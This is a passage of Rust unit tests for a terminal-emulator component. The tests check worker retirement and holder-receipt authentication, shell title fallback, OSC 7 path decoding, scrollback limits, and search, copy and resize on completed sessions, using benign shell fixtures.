include!("bounded_input_tests.rs");

use std::{
    collections::BTreeMap,
    ffi::OsStr,
    fs,
    os::unix::fs::{PermissionsExt, symlink},
    sync::atomic::{AtomicUsize, Ordering},
    time::{Duration, Instant},
};

use tempfile::tempdir;

use super::*;

fn isolated_retirement_worker_case() -> bool {
    use std::os::unix::ffi::OsStringExt;
    const CHILD: &str = "CAGENTS_TERMINAL_RETIREMENT_TEST_CHILD";
    let name = thread::current().name().unwrap().to_owned();
    if std::env::var(CHILD).as_deref() == Ok(name.as_str()) {
        return false;
    }
    let private = tempfile::Builder::new().prefix("tr-").tempdir().unwrap();
    fs::set_permissions(private.path(), fs::Permissions::from_mode(0o700)).unwrap();
    let output = private.path().join("child.log");
    let log = File::create(&output).unwrap();
    // This exact child inherits HOME and opaque caller authority unchanged.
    let mut child = std::process::Command::new(std::env::current_exe().unwrap())
        .args(["--exact", &name, "--nocapture", "--test-threads=1"])
        .env(CHILD, &name)
        .env("TMPDIR", private.path())
        .env("XDG_RUNTIME_DIR", private.path())
        .stdout(log.try_clone().unwrap())
        .stderr(log)
        .spawn()
        .unwrap();
    let deadline = Instant::now() + Duration::from_secs(40);
    let status = loop {
        if let Some(status) = child.try_wait().unwrap() {
            break status;
        }
        if Instant::now() >= deadline {
            // Remove only the owned fault before failure-only child cleanup,
            // so a holder already processing ReleaseProved can still finish.
            if let Ok(bytes) = fs::read(private.path().join("release-obstruction")) {
                let fault = PathBuf::from(std::ffi::OsString::from_vec(bytes));
                if fault.starts_with(private.path()) {
                    let _ = fs::remove_dir(fault);
                }
            }
            let _ = child.kill();
            let _ = child.wait();
            panic!(
                "retirement child timed out; evidence: {}",
                private.keep().display()
            );
        }
        thread::sleep(Duration::from_millis(5));
    };
    let log = fs::read_to_string(output).unwrap();
    print!("{log}");
    assert!(
        status.success(),
        "retirement child failed ({status}); evidence: {}",
        private.keep().display()
    );
    assert!(log.contains(&name) && log.contains("1 passed; 0 failed"));
    true
}

fn retirement_test_proof() -> crate::model::HostSessionProof {
    crate::model::HostSessionProof {
        host_session_id: crate::model::HostSessionId::new(uuid::Uuid::new_v4().to_string()),
        boot_id: crate::daemon::read_boot_id().unwrap(),
        host_incarnation: crate::model::HostIncarnation::new(uuid::Uuid::new_v4().to_string()),
    }
}

#[track_caller]
fn wait_for_retirement_fact(ready: impl FnMut() -> bool) {
    crate::test_timing::eventually("the original retirement fact", ready);
}

#[test]
fn completed_retirement_waits_for_actual_tls_join() {
    if isolated_retirement_worker_case() {
        return;
    }
    let (handle, release, entered) = TerminalHandle::spawn_with_blocked_tls_for_test();
    entered
        .recv_timeout(crate::test_timing::EVENTUALLY)
        .unwrap();
    assert!(handle.is_completed());
    assert!(!handle.worker_joined_for_test());
    let source = shell_session("exit 0");
    let proof = retirement_test_proof();
    // The TLS stays blocked until released below, so a request that
    // waited for it would not return, and one that waited for a bounded
    // shutdown would take its whole timeout.
    let started = Instant::now();
    let handle = crate::test_timing::returns("the retirement request", move || {
        handle.begin_completed_retirement().unwrap();
        handle
    });
    assert!(started.elapsed() < WORKER_JOIN_TIMEOUT);
    assert!(matches!(
        handle.completed_retirement(&source, &proof),
        TerminalRetirement::Pending
    ));
    assert!(
        !handle.worker_joined_for_test(),
        "completion publication is not OS join"
    );
    drop(release); // also releases the real destructor if an assertion unwinds
    wait_for_retirement_fact(|| handle.inner.worker.native_settled_for_test());
    assert!(handle.worker_joined_for_test());
    assert!(
        matches!(
            handle.completed_retirement(&source, &proof),
            TerminalRetirement::Retained(_)
        ),
        "holderless TLS fixture cannot manufacture native exit evidence"
    );
}

#[test]
fn late_completed_retirement_reuses_naturally_settled_original_worker() {
    if isolated_retirement_worker_case() {
        return;
    }
    let source = shell_session("printf 'natural-retirement-result'; exit 7");
    let handle = TerminalHandle::spawn(source.clone(), TerminalConfig::default(), |_| {}).unwrap();
    let worker = Arc::clone(&handle.inner.worker);
    wait_for_retirement_fact(|| handle.is_completed() && worker.native_settled_for_test());
    assert!(handle.worker_joined_for_test());
    assert_eq!(TerminalHandle::reserved_worker_joins_for_test(), 0);
    assert!(
        !handle
            .inner
            .published
            .shutdown_requested
            .load(Ordering::Acquire)
    );
    assert!(handle.snapshot().lines.iter().any(|row| {
        row.cells
            .iter()
            .map(|cell| cell.text.as_str())
            .collect::<String>()
            .contains("natural-retirement-result")
    }));
    let original = handle
        .inner
        .published
        .original_holder_process
        .get()
        .unwrap();
    let flags = unsafe { libc::fcntl(original.as_raw_fd(), libc::F_GETFD) };
    assert!(flags >= 0 && flags & libc::FD_CLOEXEC != 0);
    let proof = retirement_test_proof();
    assert!(
        matches!(
            handle.completed_retirement(&source, &proof),
            TerminalRetirement::Pending
        ),
        "natural join does not request release"
    );
    handle.begin_completed_retirement().unwrap();
    assert!(Arc::ptr_eq(&worker, &handle.inner.worker));
    assert_eq!(
        TerminalHandle::reserved_worker_joins_for_test(),
        0,
        "late request must not acquire a new cleanup ticket"
    );
    assert!(matches!(
        handle.completed_retirement(&source, &proof),
        TerminalRetirement::Released
    ));
    handle.begin_completed_retirement().unwrap();
    assert!(matches!(
        handle.completed_retirement(&source, &proof),
        TerminalRetirement::Released
    ));
    assert!(handle.worker_joined_for_test());
}

#[test]
fn checked_close_waits_for_an_adopted_reaped_roots_exact_release() {
    if isolated_retirement_worker_case() {
        return;
    }
    let proof = retirement_test_proof();
    let paths = crate::daemon::RuntimePaths::discover().unwrap();
    let _lease = crate::daemon::HostLease::acquire(&paths, &proof).unwrap();
    let mut source = shell_session("printf 'already-reaped-console'; exit 1");
    source.continuity = crate::model::TerminalContinuity::DetachedSameBoot {
        host_session_id: proof.host_session_id.clone(),
        boot_id: proof.boot_id.clone(),
        host_incarnation: proof.host_incarnation.clone(),
    };
    let config = TerminalConfig {
        holder_recovery: Some(crate::terminal::holder::Recovery {
            source: source.clone(),
            previous_sources: Vec::new(),
            relaunches: Vec::new(),
            options: super::super::TerminalSpawnOptions::default(),
            execution_environment: None,
            execution_recipe: None,
        }),
        ..TerminalConfig::default()
    };
    let (commands, receiver) = command_channel(1);
    let (events, event_receiver) = crossbeam_channel::unbounded();
    let published = Arc::new(PublishedState::new(true, Arc::new(|_| {})));
    let owner = joins::JoinOwner::new(published.clone(), joins::reserve().unwrap());
    let handle = TerminalHandle {
        inner: Arc::new(HandleInner {
            commands,
            events: event_receiver,
            published: published.clone(),
            worker: owner.clone(),
        }),
    };
    let (ready, initialized) = crossbeam_channel::bounded(1);
    let (begin, admitted) = crossbeam_channel::bounded(1);
    let worker_owner = owner.clone();
    let worker_source = source.clone();
    let worker_published = published.clone();
    owner.install(thread::spawn(move || {
        let _body = joins::BodyCompletion(worker_owner);
        let (mut worker, _) = Worker::start(
            worker_source,
            config,
            None,
            receiver,
            events,
            worker_published,
        )
        .unwrap();
        assert!(worker.child.exited_within(Duration::from_secs(5)).unwrap());
        // Adoption after this actual exit cannot capture a live root.
        // Keep its real pending exit report and PTY output for the worker.
        worker.child_identity = None;
        ready.send(()).unwrap();
        admitted.recv().unwrap();
        worker.run();
    }));
    initialized.recv_timeout(Duration::from_secs(5)).unwrap();
    let expected = handle.holder_identity().unwrap().clone();
    let closer = handle.clone();
    let close_source = source.clone();
    let close_proof = proof.clone();
    let result = thread::spawn(move || closer.close_with_receipt(&close_source, &close_proof));
    wait_for_retirement_fact(|| published.priority_close.lock().unwrap().is_some());
    begin.send(()).unwrap();
    result.join().unwrap().unwrap();
    assert!(handle.is_completed());
    assert!(
        crate::terminal::holder::cleanup::confirmed_with_role(
            &source,
            &expected,
            &proof,
            published.original_holder_role.get(),
        )
        .unwrap()
    );
}

#[test]
fn completed_retirement_waits_for_exact_holder_exit_and_authenticated_receipt() {
    if isolated_retirement_worker_case() {
        return;
    }
    use std::os::unix::{ffi::OsStrExt, fs::OpenOptionsExt};
    let proof = retirement_test_proof();
    let paths = crate::daemon::RuntimePaths::discover().unwrap();
    let _lease = crate::daemon::HostLease::acquire(&paths, &proof).unwrap();
    let mut source = shell_session("printf 'registered-retirement-result'; exit 0");
    source.continuity = crate::model::TerminalContinuity::DetachedSameBoot {
        host_session_id: proof.host_session_id.clone(),
        boot_id: proof.boot_id.clone(),
        host_incarnation: proof.host_incarnation.clone(),
    };
    let recovery = crate::terminal::holder::Recovery {
        source: source.clone(),
        previous_sources: Vec::new(),
        relaunches: Vec::new(),
        options: crate::terminal::TerminalSpawnOptions::default(),
        execution_environment: None,
        execution_recipe: None,
    };
    let handle = TerminalHandle::spawn(
        source.clone(),
        TerminalConfig {
            holder_recovery: Some(recovery),
            ..TerminalConfig::default()
        },
        |_| {},
    )
    .unwrap();
    wait_for_retirement_fact(|| handle.is_completed() && handle.worker_joined_for_test());
    let record = handle.holder_identity().unwrap().clone();
    assert!(record.holder.is_current());
    assert!(
        !record.root.is_current(),
        "actual original PTY root must already be reaped"
    );
    let original = Arc::clone(
        handle
            .inner
            .published
            .original_holder_process
            .get()
            .unwrap(),
    );
    let flags = unsafe { libc::fcntl(original.as_raw_fd(), libc::F_GETFD) };
    assert!(flags >= 0 && flags & libc::FD_CLOEXEC != 0);
    let receipt = paths.directory.join("holders").join(format!(
        "{}-{}-{}.closed",
        record.terminal, record.holder.pid, record.holder.start
    ));
    // Exercise the existing real holder's durable-receipt retry, not a fake
    // publication flag or a substitute JoinOwner. Its exclusive destination
    // is deliberately a directory until after the original release attempt.
    fs::create_dir(&receipt).unwrap();
    struct ReleaseObstruction(PathBuf);
    impl Drop for ReleaseObstruction {
        fn drop(&mut self) {
            let _ = fs::remove_dir(&self.0);
        }
    }
    let obstruction = ReleaseObstruction(receipt.clone());
    let fault_marker = std::env::temp_dir().join("release-obstruction");
    fs::write(&fault_marker, receipt.as_os_str().as_bytes()).unwrap();
    handle.begin_completed_retirement().unwrap();
    wait_for_retirement_fact(|| handle.inner.worker.native_settled_for_test());
    assert!(handle.worker_joined_for_test());
    assert_eq!(TerminalHandle::reserved_worker_joins_for_test(), 0);
    assert!(
        record.holder.is_current(),
        "receipt fault must retain the same live holder"
    );
    assert!(
        crate::daemon::child_reaper::has_outstanding_ownership(),
        "original holder Child custody must survive transfer out of JoinOwner"
    );
    match handle.completed_retirement(&source, &proof) {
        TerminalRetirement::WaitingForHolder(waiting) => {
            assert!(
                Arc::ptr_eq(&waiting, &original),
                "wait must use the held original descriptor"
            );
            assert_eq!(waiting.as_raw_fd(), original.as_raw_fd());
            let mut event = libc::pollfd {
                fd: waiting.as_raw_fd(),
                events: libc::POLLIN,
                revents: 0,
            };
            assert_eq!(
                unsafe { libc::poll(&mut event, 1, 0) },
                0,
                "original holder must still be alive"
            );
        }
        _ => panic!("join/release transfer falsely certified original holder exit"),
    }
    drop(obstruction);
    fs::remove_file(fault_marker).unwrap();
    wait_for_retirement_fact(|| {
        let mut event = libc::pollfd {
            fd: original.as_raw_fd(),
            events: libc::POLLIN,
            revents: 0,
        };
        (unsafe { libc::poll(&mut event, 1, 0) }) > 0 && event.revents & libc::POLLIN != 0
    });
    assert!(matches!(
        handle.completed_retirement(&source, &proof),
        TerminalRetirement::Released
    ));
    wait_for_retirement_fact(|| {
        !record.holder.is_current() && !crate::daemon::child_reaper::has_outstanding_ownership()
    });
    let exact_bytes = fs::read(&receipt).unwrap();
    let saved = receipt.with_extension("closed.saved");
    fs::rename(&receipt, &saved).unwrap();
    assert!(
        matches!(
            handle.completed_retirement(&source, &proof),
            TerminalRetirement::Retained(_)
        ),
        "exit alone is not the registered receipt"
    );
    let mut wrong: serde_json::Value = serde_json::from_slice(&exact_bytes).unwrap();
    wrong["sources"] = serde_json::json!([vec![0u8; 32]]);
    let mut bad_receipt = fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .mode(0o600)
        .open(&receipt)
        .unwrap();
    bad_receipt
        .write_all(&serde_json::to_vec(&wrong).unwrap())
        .unwrap();
    bad_receipt.sync_all().unwrap();
    drop(bad_receipt);
    assert!(
        matches!(
            handle.completed_retirement(&source, &proof),
            TerminalRetirement::Retained(_)
        ),
        "a different source digest cannot certify this registered owner"
    );
    fs::remove_file(&receipt).unwrap();
    fs::rename(saved, &receipt).unwrap(); // restore actual untouched holder-written inode
    assert_eq!(fs::read(&receipt).unwrap(), exact_bytes);
    assert!(matches!(
        handle.completed_retirement(&source, &proof),
        TerminalRetirement::Released
    ));
    let mut wrong_source = source.clone();
    wrong_source
        .launch
        .arguments
        .push("different-source".into());
    assert!(matches!(
        handle.completed_retirement(&wrong_source, &proof),
        TerminalRetirement::Retained(_)
    ));
    assert_eq!(handle.holder_identity(), Some(&record));
}

#[test]
fn fallback_process_title_uses_launch_when_foreground_is_unavailable() {
    let mut launch = LaunchRecipe::shell(PathBuf::from("/repo/alpha")).unwrap();
    launch.program = "/usr/bin/fish".into();
    assert_eq!(
        super::foreground_process_title(None, &launch),
        "fish · alpha"
    );
}

/// Shell titles that only say where the shell is, which its pane's
/// place already names, against titles that say more.
#[test]
fn location_titles_are_told_from_titles_that_say_more() {
    use std::path::Path;
    let home = Path::new("/home/marvin");
    let directory = Path::new("/home/marvin/.local/share/cagents/projects/acme/billing-service");
    let locates = |title: &str| super::title_locates_only(title, directory, Some(home));
    // fish's default fish_title: `prompt_pwd -d 1 -D 1`, after the running
    // command cut to 20 characters, and after an ssh host.
    assert!(locates("/h/m/.l/s/c/p/a/billing-service"));
    assert!(locates("~/.l/s/c/p/a/billing-service"));
    assert!(locates("cargo build --releas ~/.l/s/c/p/a/billing-service"));
    assert!(locates("[fw16] ~/.l/s/c/p/a/billing-service"));
    // bash's and zsh's usual `user@host: dir`, with or without the space.
    assert!(locates(
        "marvin@fw16: ~/.local/share/cagents/projects/acme/billing-service"
    ));
    assert!(locates(
        "marvin@fw16:~/.local/share/cagents/projects/acme/billing-service"
    ));
    // A full absolute path.
    assert!(locates(
        "/home/marvin/.local/share/cagents/projects/acme/billing-service"
    ));
    assert!(locates(
        "/home/marvin/.local/share/cagents/projects/acme/billing-service/"
    ));
    // A directory with a space in its name.
    let spaced = Path::new("/home/marvin/My Projects/billing service");
    assert!(super::title_locates_only(
        "marvin@fw16: ~/My Projects/billing service",
        spaced,
        Some(home)
    ));
    assert!(super::title_locates_only(
        "~/M/billing service",
        spaced,
        Some(home)
    ));
    // Home is written as `~`.
    assert!(super::title_locates_only("~", home, Some(home)));
    assert!(super::title_locates_only(
        "marvin@fw16: ~",
        home,
        Some(home)
    ));
    assert!(!locates("~"), "home is not where this shell is");

    // Real titles are kept.
    for title in [
        "main.rs - VIM",
        "htop",
        "billing-service",
        "vim src/billing-service",
        "less /etc/billing-service.conf",
        "/h/m/.l/s/c/p/a/other-service",
        // The same name elsewhere is a file or another directory.
        "vim ~/notes/billing-service",
        "less /tmp/billing-service",
        "cat /h/m/.l/s/c/p/x/billing-service",
        "billing-service-ish /billing-service",
        "Release review",
        "",
    ] {
        assert!(!locates(title), "{title:?}");
    }
}

/// A shell whose own title only says where it is shows the foreground
/// command and its directory instead; a title that says more shows as
/// it is.
#[test]
fn a_shell_location_title_gives_way_to_the_foreground_command() {
    let directory = tempfile::tempdir().unwrap();
    let working = directory.path().join("billing-service");
    std::fs::create_dir(&working).unwrap();
    let (mut worker, events) = capture_worker_for(LaunchRecipe {
        unset_environment: Default::default(),
        program: "/bin/true".into(),
        arguments: Vec::new(),
        working_directory: working.clone(),
        environment: BTreeMap::new(),
    });
    let titles = |events: &Receiver<TerminalEvent>| {
        events
            .try_iter()
            .filter_map(|event| match event {
                TerminalEvent::TitleChanged(title) => Some(title),
                _ => None,
            })
            .collect::<Vec<_>>()
    };
    let _ = titles(&events);
    // fish's `prompt_pwd` form of where the shell is: each parent cut to
    // its first character, or two for a hidden one.
    let canonical = std::fs::canonicalize(&working).unwrap();
    let abbreviated = canonical
        .parent()
        .unwrap()
        .components()
        .filter_map(|component| match component {
            std::path::Component::Normal(name) => name.to_str(),
            _ => None,
        })
        .map(|name| {
            let keep = if name.starts_with('.') { 2 } else { 1 };
            format!("/{}", name.chars().take(keep).collect::<String>())
        })
        .collect::<String>()
        + "/billing-service";
    worker.process_output(format!("\x1b]2;{abbreviated}\x07").into_bytes());
    let shown = titles(&events);
    assert!(
        shown
            .iter()
            .all(|title| title.ends_with(" · billing-service") && !title.contains('/')),
        "{shown:?}"
    );
    // Whatever holds the foreground in this harness names the command.
    let fallback = worker.display_title.clone();
    assert!(
        fallback.ends_with(" · billing-service") && !fallback.contains('/'),
        "{fallback:?}"
    );
    worker.process_output(b"\x1b]2;main.rs - VIM\x07".to_vec());
    assert_eq!(titles(&events), vec!["main.rs - VIM".to_owned()]);
    worker.process_output(format!("\x1b]2;cargo build {}\x07", canonical.display()).into_bytes());
    assert_eq!(titles(&events), vec![fallback.clone()]);
    // The observation timer keeps the command title, rather than handing
    // the row back to the location.
    worker.publish_fallback_title();
    assert_eq!(worker.display_title, fallback);
}

#[cfg(target_os = "linux")]
#[test]
fn fallback_process_title_tracks_foreground_process_directory() {
    use std::os::unix::process::CommandExt;
    let directory = tempfile::tempdir().unwrap();
    let foreground_directory = directory.path().join("alpha");
    std::fs::create_dir(&foreground_directory).unwrap();
    let mut launch = LaunchRecipe::shell(directory.path().to_owned()).unwrap();
    launch.program = "/bin/false".into();
    // A successful spawn can precede Linux publishing the new /proc comm.
    // A builtin readiness message proves the shell has reached userspace;
    // its builtin read keeps that same process alive until inspection ends.
    let mut child = std::process::Command::new("/bin/sh")
        .args(["-c", "printf ready; IFS= read -r release || :"])
        .current_dir(&foreground_directory)
        .process_group(0)
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .spawn()
        .unwrap();
    let mut ready = [0; 5];
    child
        .stdout
        .as_mut()
        .unwrap()
        .read_exact(&mut ready)
        .unwrap();
    assert_eq!(&ready, b"ready");
    let title = super::foreground_process_title(Some(child.id() as libc::pid_t), &launch);
    child.stdin.take().unwrap().write_all(b"release\n").unwrap();
    assert!(child.wait().unwrap().success());
    assert_eq!(title, "sh · alpha");
}

#[test]
fn a_second_search_window_cannot_cancel_the_first_windows_query() {
    let published = PublishedState::new(true, Arc::new(|_| {}));
    let first = published.prepare_search(Some(1), 4);
    let other = published.prepare_search(Some(2), 7);
    assert_eq!(first.load(Ordering::Acquire), 4);
    let replacement = published.prepare_search(Some(1), 5);
    assert_eq!(first.load(Ordering::Acquire), 5);
    assert_eq!(other.load(Ordering::Acquire), 7);
    drop((first, other, replacement));
    let local = published.prepare_search(None, 1);
    assert_eq!(published.searches.lock().unwrap().len(), 1);
    assert_eq!(local.load(Ordering::Acquire), 1);
}

#[test]
fn default_scrollback_byte_budget_retains_over_ten_thousand_rows() {
    let config = TerminalConfig::default();
    let mut terminal = Terminal::new(TerminalOptions {
        cols: config.columns,
        rows: config.rows,
        max_scrollback: config.max_scrollback_bytes,
    })
    .unwrap();
    terminal.vt_write(&b"output\r\n".repeat(20_000));
    assert!(terminal.scrollbar().unwrap().total > 10_000);
}

#[test]
fn scrollback_byte_budget_changes_retained_history() {
    let retained = |budget| {
        let mut terminal = Terminal::new(TerminalOptions {
            cols: 80,
            rows: 24,
            max_scrollback: budget,
        })
        .unwrap();
        terminal.vt_write(&b"output\r\n".repeat(20_000));
        terminal.scrollbar().unwrap().total
    };
    let low = retained(2 * 1024 * 1024);
    let high = retained(TerminalConfig::default().max_scrollback_bytes);
    assert!(high > low * 2, "low={low}, high={high}");
}

#[test]
fn osc7_working_directory_accepts_this_host_and_decodes_its_path() {
    let mut terminal = Terminal::new(TerminalOptions {
        cols: 80,
        rows: 24,
        max_scrollback: 0,
    })
    .unwrap();
    terminal.vt_write(b"\x1b]7;file://workstation/tmp/my%20project\x1b\\");
    assert_eq!(
        terminal.pwd().unwrap(),
        "file://workstation/tmp/my%20project"
    );
    assert_eq!(
        working_directory_path(terminal.pwd().unwrap(), || Some("WORKSTATION")),
        Some(PathBuf::from("/tmp/my project"))
    );
    assert_eq!(
        working_directory_path("file://remote/tmp/project", || Some("workstation")),
        None
    );
    // Only a directory named by host needs this machine's name.
    let unasked = || -> Option<&str> { panic!("no host to compare") };
    assert_eq!(
        working_directory_path("file://localhost/tmp/project", unasked),
        Some(PathBuf::from("/tmp/project"))
    );
    assert_eq!(
        working_directory_path("file:///tmp/project", unasked),
        Some(PathBuf::from("/tmp/project"))
    );
    assert_eq!(
        working_directory_path("/tmp/project", unasked),
        Some(PathBuf::from("/tmp/project"))
    );
}

#[test]
fn a_terminal_whose_root_exits_ends_its_output_without_an_error() {
    let mut command = CommandBuilder::new("/bin/sh");
    command.args(["-c", "echo finished"]);
    command.cwd("/");
    let (exits, exited) = crossbeam_channel::bounded(1);
    let held = holder::spawn(
        command,
        PtySize {
            rows: 24,
            cols: 80,
            pixel_width: 0,
            pixel_height: 0,
        },
        exits,
    )
    .unwrap();
    let mut reader = File::from(held.master.duplicate().unwrap());
    let readiness = held.master.duplicate().unwrap();
    let (wake_rx, _wake_tx) = wake_pipe().unwrap();
    let (sender, messages) = crossbeam_channel::unbounded();
    read_pty(
        &mut reader,
        &sender,
        readiness,
        wake_rx,
        &AtomicBool::new(false),
    );

    let messages: Vec<_> = messages.try_iter().collect();
    let output: Vec<u8> = messages
        .iter()
        .filter_map(|message| match message {
            PtyMessage::Bytes(bytes) => Some(bytes.as_slice()),
            _ => None,
        })
        .flatten()
        .copied()
        .collect();
    assert!(String::from_utf8_lossy(&output).contains("finished"));
    assert!(
        matches!(messages.last(), Some(PtyMessage::Eof)),
        "{:?}",
        messages.last().map(|message| match message {
            PtyMessage::Error(error) => error.as_str(),
            _ => "not the end",
        })
    );
    let status = exited
        .recv_timeout(Duration::from_secs(5))
        .unwrap()
        .unwrap();
    assert!(status.success());
}

#[test]
fn completion_event_certifies_ended_worker_without_polling() {
    let handle = TerminalHandle::spawn(
        shell_session("printf 'final output'; exit 7"),
        TerminalConfig::default(),
        |_| {},
    )
    .unwrap();
    let events = handle.events();
    let deadline = std::time::Instant::now() + Duration::from_secs(5);
    loop {
        match events.recv_deadline(deadline).unwrap() {
            TerminalEvent::Completed { exit_code, .. } => {
                assert_eq!(exit_code, 7);
                assert!(
                    handle.is_completed(),
                    "a completion observer must immediately see ended continuity"
                );
                assert!(handle.snapshot().lines.iter().any(|line| {
                    line.cells
                        .iter()
                        .map(|cell| cell.text.as_str())
                        .collect::<String>()
                        .contains("final output")
                }));
                break;
            }
            TerminalEvent::Error { operation, message } => panic!("{operation}: {message}"),
            _ => {}
        }
    }
}

#[test]
fn late_stop_after_actual_join_does_not_wait_for_cached_archive_metadata() {
    use super::super::ipc::TerminalCloseResult;

    let (handle, release, entered) = TerminalHandle::spawn_with_blocked_tls_for_test();
    entered.recv_timeout(Duration::from_secs(2)).unwrap();
    assert!(handle.is_completed());
    assert!(!handle.worker_joined_for_test());
    drop(release);
    let deadline = Instant::now() + Duration::from_secs(5);
    while !handle.inner.worker.native_settled_for_test() {
        assert!(Instant::now() < deadline);
        thread::sleep(Duration::from_millis(5));
    }
    assert!(
        !handle
            .inner
            .published
            .shutdown_requested
            .load(Ordering::Acquire)
    );

    thread::scope(|scope| {
        // The guard drops before scope joins if an assertion unwinds.
        // Keep it held through both public operations to prove neither
        // native Stop proof nor later command admission waits on it.
        let archive = handle.inner.published.archive.lock().unwrap();
        let other = handle.clone();
        let (sent, received) = crossbeam_channel::bounded(1);
        scope.spawn(move || {
            let closed = other.close_checked(true);
            let search = other.search(9, "cached".into(), false);
            let _ = sent.send((closed, search));
        });
        let (closed, search) = received.recv_timeout(Duration::from_secs(1)).unwrap();
        assert!(matches!(closed, TerminalCloseResult::Closed), "{closed:?}");
        assert_eq!(search, Err(TerminalSendError::Closed));
        assert!(handle.worker_joined_for_test());
        drop(archive);
    });
}

#[test]
fn completed_pty_retains_search_copy_scroll_theme_and_resize_without_a_worker() {
    let handle = TerminalHandle::spawn(shell_session("i=0; while [ $i -lt 80 ]; do printf 'row%03d\\r\\n' \"$i\"; i=$((i+1)); done; printf '\\033[?2027h👩‍💻hit É Straße'; exit 7"), TerminalConfig { columns: 32, rows: 3, ..TerminalConfig::default() }, |_| {}).unwrap();
    let deadline = std::time::Instant::now() + Duration::from_secs(5);
    while !handle.is_completed() {
        assert!(std::time::Instant::now() < deadline);
        thread::sleep(Duration::from_millis(5));
    }
    // Natural body completion automatically admits its actual OS join,
    // without requesting Stop or releasing the archived read-only view.
    while !handle.worker_joined_for_test() {
        assert!(std::time::Instant::now() < deadline);
        thread::sleep(Duration::from_millis(5));
    }
    let events = handle.events();
    assert_eq!(
        events
            .try_iter()
            .filter(|event| matches!(event, TerminalEvent::Completed { exit_code: 7, .. }))
            .count(),
        1
    );
    assert!(handle.snapshot().scroll.total > 80);
    handle.search(3, "é".into(), false).unwrap();
    let matches = match events.recv_timeout(Duration::from_secs(1)).unwrap() {
        TerminalEvent::SearchResults {
            request: 3,
            matches,
            ..
        } => matches,
        other => panic!("{other:?}"),
    };
    assert_eq!(matches.len(), 1);
    assert_eq!(matches[0].start_column, 6);
    handle.scroll_to_row(0).unwrap();
    assert!(
        handle.snapshot().lines[0]
            .cells
            .iter()
            .map(|cell| cell.text.as_str())
            .collect::<String>()
            .contains("row000")
    );
    handle.scroll_to_row(matches[0].start_row as usize).unwrap();
    assert!(handle.snapshot().lines.iter().any(|row| {
        row.cells
            .iter()
            .map(|cell| cell.text.as_str())
            .collect::<String>()
            .contains("hit")
    }));
    let request = uuid::Uuid::new_v4();
    handle
        .copy_selection(
            request,
            super::super::SearchMatch {
                start_row: 0,
                start_column: 0,
                end_row: handle.snapshot().scroll.total - 1,
                end_column: 32,
            },
        )
        .unwrap();
    match events.recv_timeout(Duration::from_secs(1)).unwrap() {
        TerminalEvent::ClipboardText { request: id, text } => {
            assert_eq!(id, request);
            assert!(text.starts_with("row000\n"));
            assert!(text.contains("👩‍💻hit É Straße"));
        }
        other => panic!("{other:?}"),
    }
    handle
        .resize(TerminalSize {
            columns: 10,
            rows: 5,
            cell_width_px: 9,
            cell_height_px: 18,
        })
        .unwrap();
    assert_eq!(
        handle.snapshot().columns,
        32,
        "read-only output preserves its original column coordinates"
    );
    assert_eq!(handle.snapshot().rows, 5);
    let old_background = handle.snapshot().background;
    handle.set_theme(TerminalTheme::Light).unwrap();
    assert_ne!(handle.snapshot().background, old_background);
    handle.clear_scrollback().unwrap();
    handle.search(4, "row000".into(), true).unwrap();
    assert!(
        matches!(events.recv_timeout(Duration::from_secs(1)).unwrap(), TerminalEvent::SearchResults { matches, .. } if matches.is_empty())
    );
    handle.shutdown().unwrap();
    assert_eq!(
        handle.search(5, "hit".into(), true),
        Err(TerminalSendError::Closed)
    );
    assert!(events.recv_timeout(Duration::from_millis(100)).is_err());
}

/// The daemon resizes, searches and copies while holding the host mutex
/// its wake and event callbacks lock. A completed terminal runs those
/// commands on the sender's thread, so calling back inline wedged the
/// whole daemon the first time a pane showing one was resized.
#[test]
fn completed_pty_notifies_a_subscriber_whose_lock_the_sender_holds() {
    let host = Arc::new(Mutex::new((Vec::new(), Vec::new())));
    let wakes = Arc::clone(&host);
    let handle = TerminalHandle::spawn(
        shell_session("printf 'retained'; exit 0"),
        TerminalConfig::default(),
        move |wake| wakes.lock().unwrap().0.push(wake.generation),
    )
    .unwrap();
    let events = Arc::clone(&host);
    handle.set_archived_event_observer(move |_, event| events.lock().unwrap().1.push(event));
    let deadline = std::time::Instant::now() + Duration::from_secs(5);
    while !handle.is_completed() {
        assert!(std::time::Instant::now() < deadline);
        thread::sleep(Duration::from_millis(5));
    }

    let held = host.lock().unwrap();
    handle
        .resize(TerminalSize {
            columns: 10,
            rows: 5,
            cell_width_px: 9,
            cell_height_px: 18,
        })
        .unwrap();
    handle.search(1, "retained".into(), true).unwrap();
    let generation = handle.generation();
    drop(held);

    flush_archived_notices();
    let (wakes, events) = &*host.lock().unwrap();
    assert!(wakes.contains(&generation));
    assert!(
        events
            .iter()
            .any(|event| matches!(event, TerminalEvent::SearchResults { request: 1, .. }))
    );
    handle.shutdown().unwrap();
}

/// One notifier thread outlives every completed terminal, so a subscriber
/// that panics must cost only its own notice.
#[test]
fn a_panicking_archived_notice_does_not_silence_later_ones() {
    notify_archived(|| panic!("fixture subscriber failure"));
    let (delivered, later) = crossbeam_channel::bounded(1);
    notify_archived(move || {
        let _ = delivered.send(());
    });
    later
        .recv_timeout(crate::test_timing::EVENTUALLY)
        .expect("the notifier stopped after one subscriber panicked");
}

#[test]
fn stalled_archive_preparation_bounds_request_wait() {
    let handle = TerminalHandle::spawn(
        shell_session("exec /bin/cat"),
        TerminalConfig::default(),
        |_| {},
    )
    .unwrap();
    *handle.inner.published.archive.lock().unwrap() = ArchivePhase::Preparing;
    handle.set_host_visibility(super::super::ipc::TerminalVisibility::Hidden);
    assert!(!handle.inner.published.visible.load(Ordering::Acquire));
    // Preparation never finishes on its own, so a request that waited
    // for it without a bound would not return.
    let (handle, searched) = crate::test_timing::returns("the search request", move || {
        let searched = handle.search(1, "query".into(), true);
        (handle, searched)
    });
    assert_eq!(searched, Err(TerminalSendError::Closed));
    *handle.inner.published.archive.lock().unwrap() = ArchivePhase::Live;
    handle.inner.published.archive_ready.notify_all();
    handle.shutdown().unwrap();
}

/// A full command queue is when a worker is busiest, not when it may
/// ignore a reveal: a refused one left it hidden, capturing nothing,
/// while a client showed it.
#[test]
fn a_host_reveal_reaches_a_worker_whose_command_queue_is_full() {
    let (woken, wakes) = crossbeam_channel::unbounded();
    let handle = TerminalHandle::spawn(
        shell_session("exec /bin/cat"),
        TerminalConfig {
            initially_visible: false,
            command_capacity: 4,
            ..TerminalConfig::default()
        },
        move |wake| {
            let _ = woken.send(wake.generation);
        },
    )
    .unwrap();
    // The worker answers this read and then waits, inside the command,
    // until the test takes the answer, so nothing drains the queue. The
